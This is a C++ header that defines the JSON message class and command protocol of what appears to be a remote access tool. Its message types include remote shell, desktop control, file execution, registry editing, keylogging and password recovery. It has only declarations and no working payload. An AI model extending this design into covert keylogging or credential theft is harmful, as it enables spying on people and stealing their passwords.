#pragma once
#include <string>
#include <cstdint>
#include <nlohmann/json.hpp>

namespace rslm {
	namespace net {

		using json = nlohmann::json;

		class Message {
		public:
			std::string type;
			std::string senderId;
			std::string targetId;
			uint32_t tag = 0;
			int64_t timestamp = 0;

			json payload;

			Message() = default;
			explicit Message(const json& j);

			json ToJson() const;
			std::string ToJsonString() const;
			static Message FromJson(const std::string& jsonStr);

			static Message CreateRequest(const std::string& type,
				const std::string& sender,
				const std::string& target,
				const json& data = {});

			static Message CreateResponse(const Message& request,
				const json& data = {});

			static Message CreateError(const Message& request,
				const std::string& error);
		};

		namespace MessageType {
			constexpr auto HELLO = "hello";
			constexpr auto HELLO_ACK = "hello_ack";
			constexpr auto FILE_LIST_REQUEST = "file-list-request";
			constexpr auto FILE_LIST_RESPONSE = "file-list-response";
			constexpr auto FILE_DOWNLOAD_REQ = "file-download-request";
			constexpr auto FILE_DOWNLOAD_RES = "file-download-response";
			constexpr auto FILE_UPLOAD = "file-upload";
			constexpr auto FILE_DELETE_REQ = "file-delete-request";
			constexpr auto FILE_EXECUTE = "file-execute";
			constexpr auto DESKTOP_START = "desktop-start";
			constexpr auto DESKTOP_STOP = "desktop-stop";
			constexpr auto DESKTOP_FRAME = "desktop-frame";
			constexpr auto DESKTOP_MOUSE = "desktop-mouse";
			constexpr auto DESKTOP_KEYBOARD = "desktop-keyboard";
			constexpr auto SHELL_OPEN = "shell-open";
			constexpr auto SHELL_CLOSE = "shell-close";
			constexpr auto SHELL_COMMAND = "shell-command";
			constexpr auto SHELL_OUTPUT = "shell-output";
			constexpr auto TASK_LIST = "task-list";
			constexpr auto TASK_KILL = "task-kill";
			constexpr auto TASK_START = "task-start";
			constexpr auto SYSTEM_INFO = "system-info";
			constexpr auto REG_READ = "reg-read";
			constexpr auto REG_WRITE = "reg-write";
			constexpr auto REG_DELETE = "reg-delete";
			constexpr auto REG_ENUM = "reg-enum";
			constexpr auto KEYLOG_START = "keylog-start";
			constexpr auto KEYLOG_STOP = "keylog-stop";
			constexpr auto KEYLOG_DATA = "keylog-data";
			constexpr auto PASSWD_RECOVER = "passwd-recover";
		}
	}
}